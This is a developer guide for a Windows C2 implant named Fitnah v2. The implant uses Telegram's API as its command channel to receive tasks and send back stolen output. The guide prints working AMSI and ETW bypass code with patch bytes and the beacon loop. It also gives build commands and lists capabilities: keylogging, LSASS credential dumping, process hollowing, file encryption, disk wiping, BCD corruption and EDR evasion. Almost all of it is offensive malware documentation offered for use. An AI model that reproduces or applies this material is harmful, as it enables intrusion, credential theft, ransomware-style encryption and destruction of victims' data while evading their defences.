# Implant Guide — Fitnah v2

This guide covers how the C implant works internally, the wire protocol, cryptography, and how to compile it with mingw-w64 on Linux or Windows.

---

## Overview

The Fitnah implant (`fitnah_implant.c`) is a C99 Windows PE that:
1. Beacons to `api.telegram.org` at a configurable interval
2. Receives JSON task messages from the Telegram group
3. Executes commands and returns output as ACK messages
4. Uses BCrypt AES-256-GCM for all sensitive data on disk

It has **zero external C2 infrastructure** — it only needs internet access to `api.telegram.org:443`. This means the implant works through virtually every corporate proxy and firewall.

---

## How the Beacon Loop Works

```c
// Simplified beacon loop (fitnah_implant.c)
while (running) {
    // 1. Check for new tasks from Telegram
    char *updates = tg_get_updates(bot_token, last_update_id);

    // 2. Parse JSON for TASK messages addressed to our group
    Task *task = parse_task(updates, chat_id);
    if (task) {
        // 3. Dispatch to the appropriate command handler
        char *result = cmd_dispatch(task);

        // 4. Send ACK back to the operator via Telegram
        tg_send_message(bot_token, chat_id, result);
        free(result);
        task_free(task);
    }

    // 5. Sleep with jitter
    DWORD sleep_ms = FITNAH_SLEEP * 1000;
    DWORD jitter_ms = (rand() % (sleep_ms * FITNAH_JITTER / 100));
    ObfuscatedSleep(sleep_ms + jitter_ms);  // memory-encrypted sleep
}
```

The `ObfuscatedSleep()` call (from `evasion/sleep_obfuscation.c`) XOR-encrypts the implant's own memory during the sleep period, defeating runtime memory scanners like PE-sieve and Moneta.

---

## Wire Protocol

All messages are **plaintext JSON** sent as Telegram chat messages. There is no additional encryption on the wire — the Telegram API handles TLS.

### CHECKIN (agent → operator)
Sent on first beacon and every N intervals:
```json
{
  "type": "CHECKIN",
  "agent_id": "abc12345",
  "hostname": "WORKSTATION01",
  "username": "CORP\\alice",
  "os": "Windows 10 22H2",
  "arch": "x64",
  "ip": "192.168.1.105",
  "priv_level": "user",
  "pid": 4892,
  "ppid": 1234
}
```

### TASK (operator → agent)
```json
{
  "type": "TASK",
  "id": "a1b2c3d4",
  "command": "exec",
  "args": {
    "cmd": "whoami /all"
  }
}
```

The `id` field is a random 8-character hex string. The implant echoes it back in the ACK so the operator can match responses to requests.

### ACK (agent → operator)
```json
{
  "type": "ACK",
  "id": "a1b2c3d4",
  "status": "ok",
  "output": "nt authority\\system\n..."
}
```

`status` is `"ok"` on success, `"error"` on failure.

---

## Cryptography

### AES-256-GCM (BCrypt API)
Used for: encrypting artefacts to disk, key derivation in the encrypt_files command.

The implant uses the **Windows CNG BCrypt API** (`bcrypt.h`) — no OpenSSL, no libsodium. This avoids external dependencies and keeps the binary small.

```c
// crypto.c — simplified
BOOL crypto_encrypt(
    const BYTE *plaintext, DWORD pt_len,
    const BYTE *key, DWORD key_len,   // 32 bytes for AES-256
    BYTE **ciphertext, DWORD *ct_len
) {
    BCRYPT_ALG_HANDLE hAlg;
    BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                      (PUCHAR)BCRYPT_CHAIN_MODE_GCM, ...);
    // ... nonce generation, GCM tag, encryption
}
```

Key format on disk: `[16-byte nonce][ciphertext][16-byte GCM tag]`

### XOR (simple obfuscation)
Used for: string obfuscation at rest in the binary, memory encryption during sleep.

---

## AMSI and ETW Bypass

The `bypass.c` module patches two functions in memory at startup:

### AMSI bypass
```c
// Patch AmsiScanBuffer to always return AMSI_RESULT_CLEAN
void bypass_amsi() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    FARPROC pScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    // Write: mov eax, 0x80070057; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD old;
    VirtualProtect(pScan, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(pScan, patch, sizeof(patch));
    VirtualProtect(pScan, sizeof(patch), old, &old);
}
```

### ETW bypass
```c
// Patch EtwEventWrite to return immediately
void bypass_etw() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pEtw = GetProcAddress(hNtdll, "EtwEventWrite");
    BYTE patch[] = { 0xC3 };  // just: ret
    // ... apply patch
}
```

---

## Command Handlers

All command handling goes through `cmd_dispatch()` in `commands.c`:

| Command | Handler | Description |
|---|---|---|
| `exec` | `cmd_exec()` | Run via `cmd /c` |
| `ps` | `cmd_ps()` | Run via `powershell -nop -c` |
| `screenshot` | `cmd_screenshot()` | GDI screen capture → base64 |
| `download` | `cmd_download()` | Read file → base64 |
| `upload` | `cmd_upload()` | Write base64 → file |
| `keylogger` | `cmd_keylogger()` | Start/stop/dump keystroke log |
| `process_hollow` | `cmd_process_hollow()` | Hollow target process with shellcode |
| `encrypt_files` | `cmd_encrypt_files()` | AES-256-GCM encrypt file tree |
| `wipe_artifacts` | `cmd_wipe_artifacts()` | Delete forensic artefacts |
| `disk_disrupt` | `cmd_disk_disrupt()` | Destructive disk operations |
| `etw_patch` | `cmd_etw_patch()` | Patch ETW at runtime |
| `chunked_send` | `cmd_chunked_send()` | Upload large file in parts |
| `die` | `running = 0` | Shut down the implant |

---

## C Module Map

| File | What it does |
|---|---|
| `fitnah_implant.c` | Entry point, WinMain, beacon loop, checkin |
| `src/http.c` | WinINet wrappers for `api.telegram.org` HTTPS calls |
| `src/crypto.c` | BCrypt AES-256-GCM encrypt/decrypt |
| `src/bypass.c` | AMSI + ETW patches applied at startup |
| `src/commands.c` | Task dispatcher, all command handler functions |
| `src/utils.c` | Base64 encode/decode, JSON builder/parser |
| `evasion/sleep_obfuscation.c` | XOR memory encryption during sleep (Ekko-like) |
| `evasion/unhook.c` | Re-read NTDLL from disk to remove userland hooks |
| `evasion/anti_analysis.c` | Timestomping, PEB unlinking, header erasure |
| `evasion/memory_patcher.c` | Syscall table resolver, EDR hook removal |
| `injection/rdi_loader.c` | Reflective DLL injection loader |
| `injection/code_cave.c` | Find and inject into code caves |
| `injection/process_mirror.c` | Fork a process and mirror its memory |
| `syscall/direct_syscall.c` | Direct NT syscall stubs (bypasses userland hooks) |
| `collection/lsass_dump.c` | Dump LSASS via direct handle |
| `exploits/cve_exploits.c` | CVE-2021-1732 and Zerologon skeletons |
| `impact/artifact_wipe.c` | Event log clearing, browser history, jump lists |
| `impact/disk_wipe.c` | Physical drive wipe, BCD corruption, shadow copy deletion |
| `process_hollowing.c` | Full process hollowing implementation |
| `reflective_loader.c` | Manual PE map from memory (no LoadLibrary) |
| `asm/syscalls.asm` | Raw syscall stubs in NASM (Windows x64 calling convention) |

---

## Compiling

### Prerequisites
- **Linux:** `apt install mingw-w64 nasm`
- **Windows:** msys2 with `pacman -S mingw-w64-x86_64-gcc nasm`

### Basic build
```bash
cd implant/
make TOKEN="123456:ABC" CHAT_ID="-100999" AGENT_ID="agent-001"
# Output: ../build/fitnah_x64.exe
```

### 32-bit build
```bash
make TOKEN="..." CHAT_ID="..." AGENT_ID="..." ARCH=x86
# Output: ../build/fitnah_x86.exe
```

### All Makefile variables

| Variable | Default | Description |
|---|---|---|
| `TOKEN` | YOUR_BOT_TOKEN | Telegram bot token |
| `CHAT_ID` | YOUR_CHAT_ID | Telegram group chat ID |
| `AGENT_ID` | agent-001 | Unique agent identifier |
| `SLEEP` | 5 | Beacon sleep interval (seconds) |
| `JITTER` | 20 | Jitter percentage |
| `ARCH` | x64 | Target architecture: `x64` or `x86` |

### Compiler flags explained

| Flag | Reason |
|---|---|
| `-O2 -s` | Optimise and strip symbol table |
| `-mwindows` | No console window (WinMain entry) |
| `-static` | Link CRT statically — no MSVC runtime dependency |
| `-lwininet` | WinINet for HTTPS |
| `-lbcrypt` | CNG BCrypt for AES-256-GCM |
| `-lntdll` | Direct NT API access |
| `-lpsapi` | Process enumeration |
| `-ldbghelp` | MiniDump for LSASS dump |

### Using the builder (recommended)
Rather than invoking make manually, use the `builder` command in the operator console — it handles token/chat_id injection automatically:

```
op_nightfall > builder -f exe -a agent-001 --arch x64 --sleep 10 --jitter 30
```

---

## Anti-Analysis Features

The implant applies several anti-analysis techniques at runtime:

1. **AMSI patch** — patches `AmsiScanBuffer` before any PS execution
2. **ETW patch** — patches `EtwEventWrite` to suppress telemetry
3. **PEB unlinking** — removes the implant from the process list visible to tooling
4. **PE header erasure** — zeroes the DOS/PE headers after load (defeats memory scanners)
5. **Timestomping** — copies timestamps from `kernel32.dll` to the implant on disk
6. **Obfuscated sleep** — XOR-encrypts the implant image during sleep periods
7. **NTDLL unhooking** — re-reads NTDLL from disk to bypass EDR userland hooks
8. **Direct syscalls** — uses raw syscall stubs to bypass hooked `ntdll!Nt*` functions
